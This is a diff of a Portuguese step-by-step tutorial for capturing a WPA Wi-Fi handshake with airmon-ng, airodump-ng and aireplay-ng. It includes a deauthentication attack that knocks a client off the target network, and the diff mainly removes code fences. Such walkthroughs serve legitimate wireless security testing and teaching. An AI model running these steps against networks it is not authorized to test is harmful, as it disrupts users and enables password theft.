@@ -7,6 +7,8 @@ description: 'Esse é um passo a passo que geralmente uso para capturar um HANDS
 
 # Handshake capture
 
+texto original: https://github.com/geleiaa/wirelesssss/blob/main/crackwpa.md
+
 > Para esse ataque você vai precisar de:
 > 
 > 1 - um adaptador wifi com um chiset que suporte no minimo monitor-mode e package-injection
@@ -21,31 +23,31 @@ ________________________________________________________________________________
 # Primeiro passo: 
 ## verificar se seu chipset suporta os modos citados acima.
 
-###### Mostra informações sobre a interface/placa de rede:
-```
-$ iw list   
-``` 
-###### Aparecera várias informações sobre a interface, caso suporte os modos, na saida do comando procure algo assim:	
+##### Mostra informações sobre a interface/placa de rede:
 
-```
+$ iw list
+
+##### Aparecera várias informações sobre a interface, caso suporte os modos, na saida do comando procure algo assim:
+
+
 Supported interface modes:
 		 * managed
 		 * monitor
-```
+
 
 ou
-```
+
 $ sudo airmon-ng (com --verbose p/ mais detalhes)
-```
+
 ##### Mostrara o nome da interface e o chipset, depois pesquisar para saber os modos que chipset suporta.
 ##### A saida será parecida com essa:
-```
+
 PHY	Interface	Driver		Chipset
 
 phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
-```
 
-($ ifconfig ou $ iwconfig para ver o nome do internace)
+
+##### ($ ifconfig ou $ iwconfig para ver o nome do internace)
 
 
 
@@ -55,38 +57,38 @@ ________________________________________________________________________________
 ## Colocar sua interface em monitor mode
 
 ##### Matar porcessos que interferem no modo mon:
-```
+
 $ sudo airmon-ng check kill 
-```
+
 
 ##### A saida será parecida com essa:
-```
+
 Killing these processes:
 
   PID Name
   870 dhclient
- 1115 wpa_supplicant
-``` 
+  1115 wpa_supplicant
+ 
 
 
-##### Depois dar um "start" na interface
-```
+##### Depois dar um "start" na interface:
+
 $ sudo airmon-ng start <interface> 
-``` 
+ 
 
 ##### A saida será parecida com essa:
-```
+
 PHY	Interface	Driver		Chipset
 
 phy0	wlan0mon	ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
 		(mac80211 station mode vif enabled on [phy0]wlan0)
 		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)
-```    
+    
     
 ##### $ ifconfig ou $ iwconfig para confirmar que a interface esta em monitor-mode
 ##### Se a interface estiver em monitor-mode voc verá algo assim:
 ##### (repare em Mode:Monitor)
-```
+
  ath0      IEEE 802.11g  ESSID:""  
         Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82   
         Bit Rate=2 Mb/s   Tx-Power:18 dBm   Sensitivity=0/3  
@@ -96,7 +98,7 @@ phy0	wlan0mon	ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
         Link Quality=0/94  Signal level=-96 dBm  Noise level=-96 dBm
         Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
         Tx excessive retries:0  Invalid misc:0   Missed beacon:0
-```
+
 
 
 
@@ -104,11 +106,11 @@ phy0	wlan0mon	ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
 _________________________________________________________________________________________________________________________________________________________
 # Terceiro passo
 ##### "Sniffar" redes em volta para identificar seu alvo
-```
+
 $ sudo airodump-ng <interface>
-````
+`
 ##### A saida sera parecida com essa:
-```
+
  CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ]
                                                                                                             
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
@@ -123,7 +125,7 @@ $ sudo airodump-ng <interface>
  (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy 
  00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5
  00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy
- ```
+ 
  
 
 * BSSID = Mac Address do AP (roteador)
@@ -137,9 +139,9 @@ $ sudo airodump-ng <interface>
 _________________________________________________________________________________________________________________________________________________________
  # Quarto passo
  ##### Depois de identificar o alvo, comece a captura dos pacotes da rede alvo para então capturar o HANDSHAKE
- ```
+ 
  $ sudo airodump-ng --bssid <macaddr> -c <canal> -w <arquivo> <interface>
- ```
+ 
  > --bssid mac address do AP alvo
  >
  > -c seleciona o canal do AP para evitar perda de pacotes
@@ -154,9 +156,9 @@ ________________________________________________________________________________
  ##### Enquanto o trafego do alvo é capturado, você devera fazer um ataque de Deauthentication em um dispositivo que está conectado ao AP, para ele ser desconectado. Em seguida o dispositivo irá se conectar de novo automaticamente (ou manualmente por alguém). E é nessa hora que o HANDSHAKE é capturado...
  
  ##### Para desautenticar uma STATION de um AP sera usado o aireplay-ng:
- ```
+ 
  $ aireplay-ng -0 1 -a <macAP> -c <macSTATION> <interface>
- ```
+ 
  > -0 especifica o Deauthentication attack   
  > 1 é o número de deauths a serem enviados  
  > -a mac do AP alvo   
@@ -164,12 +166,12 @@ ________________________________________________________________________________
  ##### Obs: mandar poucos deauths pois pode influênciar na captura do trafego
  
  ##### A saida sera parecida com essa:
- ```
+ 
  12:35:25  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9
  12:35:25  Sending 64 directed DeAuth. STMAC: [00:0F:B5:AE:CE:9D] [ 61|63 ACKs]
  
  [ ACKs recebidos da STATION | ACKs recebidos do AP]
- ```
+ 
  
  
  
@@ -178,15 +180,15 @@ ________________________________________________________________________________
  # Sexto passo
  ##### Se o Quinto passo for bem sucedido, no terminal do airodump-ng capturando os pacotes irá aparecer o seguinte [ WPA handshake: 00:14:6C:7E:40:80
  Exemplo:
- ```
-	 CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7E:40:80
+ 
+	  CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7E:40:80
                                                                                                             
           BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                             
           00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR                         
           00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP         bigbear 
-          00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy       
- ```
+          00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy 
+ 
  
  ##### Depois do handshake capturado você já pode encerrar a captura e se você verifcar o diretorio atual, vera alguns arquivos incluindo a captura do trafego( arquivo.cap)
  
